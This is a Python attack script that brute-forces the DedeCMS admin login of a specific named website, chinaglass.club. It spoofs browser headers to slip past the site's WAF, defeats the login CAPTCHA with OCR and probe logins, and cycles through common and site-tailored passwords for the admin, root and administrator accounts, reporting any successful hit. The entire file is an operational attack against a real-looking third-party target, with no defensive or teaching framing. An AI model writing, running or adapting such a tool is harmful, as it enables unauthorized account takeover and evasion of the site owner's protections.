#!/usr/bin/env python3
"""bf_dede_final.py - chinaglass.club DedeCMS最终爆破
完整浏览器头绕WAF + 验证码自适应(错误重取) + 密码错误才换
"""
import urllib.request, urllib.parse, ssl, re, http.cookiejar, sys, time, io
import ddddocr
from PIL import Image

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
       'Accept-Language': 'zh-CN,zh;q=0.9',
       'Accept-Encoding': 'identity',
       'Connection': 'keep-alive'}
BASE = 'http://chinaglass.club'
LOGIN_URL = BASE + '/admin/login.php'
CAP_URL = BASE + '/include/vdimgck.php'

PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
             "000000", "qwer1234", "abc123", "admin666", "123123", "111111",
             "654321", "admin2023", "admin2024", "Admin123", "123qwe", "zxcvbnm",
             "admin12345", "dedecms", "chinaglass", "123456789", "1qaz2wsx",
             "qwe123", "admin!@#", "adminadmin", "chinaglass123", "cg123456"]

ocr = ddddocr.DdddOcr(show_ad=False)
ocrb = ddddocr.DdddOcr(show_ad=False, beta=True)

def get_captcha(opener):
    """取验证码, 返回code或None"""
    for _ in range(6):
        time.sleep(1.5)
        try:
            r = opener.open(urllib.request.Request(CAP_URL, headers={**UA, 'Referer': LOGIN_URL}), timeout=10)
            img = r.read()
            if img[:2] != b'\xff\xd8':
                continue
            im = Image.open(io.BytesIO(img)).convert('L')
            im = im.resize((im.width * 3, im.height * 3), Image.LANCZOS)
            im = im.point(lambda p: 255 if p > 130 else 0)
            buf = io.BytesIO(); im.save(buf, 'PNG')
            c1 = ocr.classification(img)
            c2 = ocrb.classification(buf.getvalue())
            code = c1 if c1 == c2 else (c2 if len(c2) == 4 else c1)
            # 试一下验证码是否正确(用错误密码探测)
            st = try_login(opener, 'admin', 'zz_probe_' + str(int(time.time())), code)
            if st == 'captcha_wrong':
                continue
            return code
        except Exception:
            continue
    return None

def try_login(opener, user, pw, code):
    data = urllib.parse.urlencode({'gotopage': '/admin/', 'dopost': 'login', 'adminstyle': 'newdedecms',
                                   'userid': user, 'pwd': pw, 'validate': code}).encode()
    try:
        req = urllib.request.Request(LOGIN_URL, data=data,
                                     headers={**UA, 'Content-Type': 'application/x-www-form-urlencoded',
                                              'Referer': LOGIN_URL})
        resp = opener.open(req, timeout=10)
        b = resp.read(8000).decode('gbk', 'ignore')
        fu = resp.geturl()
        st = resp.status
    except urllib.error.HTTPError as e:
        st, b, fu = e.code, e.read(8000).decode('gbk', 'ignore'), e.geturl()
    except Exception as e:
        return 'error'
    if 'stopinfo' in fu or 'vhostgo' in fu:
        return 'waf'
    if '楠岃瘉鐮佷笉姝' in b:
        return 'captcha_wrong'
    if '閿欒' in b or '错误' in b or '瀵嗙爜' in b or '不存在' in b:
        return 'pw_wrong'
    if st == 302 and 'login' not in fu.lower():
        return 'HIT:' + fu
    return 'unknown:' + b[:80]

def main():
    for user in ['admin', 'root', 'administrator']:
        cj = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj),
                                             urllib.request.HTTPSHandler(context=ctx))
        try:
            opener.open(urllib.request.Request(LOGIN_URL, headers=UA), timeout=10).read()
        except Exception:
            pass
        for pw in PASSWORDS:
            for cap_attempt in range(4):
                code = get_captcha(opener)
                if not code:
                    print('captcha fail, sleep 30', flush=True)
                    time.sleep(30)
                    continue
                result = try_login(opener, user, pw, code)
                if result == 'captcha_wrong':
                    continue  # 重试验证码
                if result == 'waf':
                    print('%s/%s: WAF, sleep 60' % (user, pw), flush=True)
                    time.sleep(60)
                    break
                if result == 'pw_wrong':
                    print('%s/%s: pw wrong' % (user, pw), flush=True)
                    time.sleep(3)
                    break
                if result.startswith('HIT'):
                    print('!!! HIT: %s/%s -> %s' % (user, pw, result), flush=True)
                    sys.exit(0)
                print('CHECK %s/%s: %s' % (user, pw, result[:100]), flush=True)
                time.sleep(3)
                break
        print('user %s done' % user, flush=True)
    print('=== NO HIT ===')

if __name__ == '__main__':
    main()
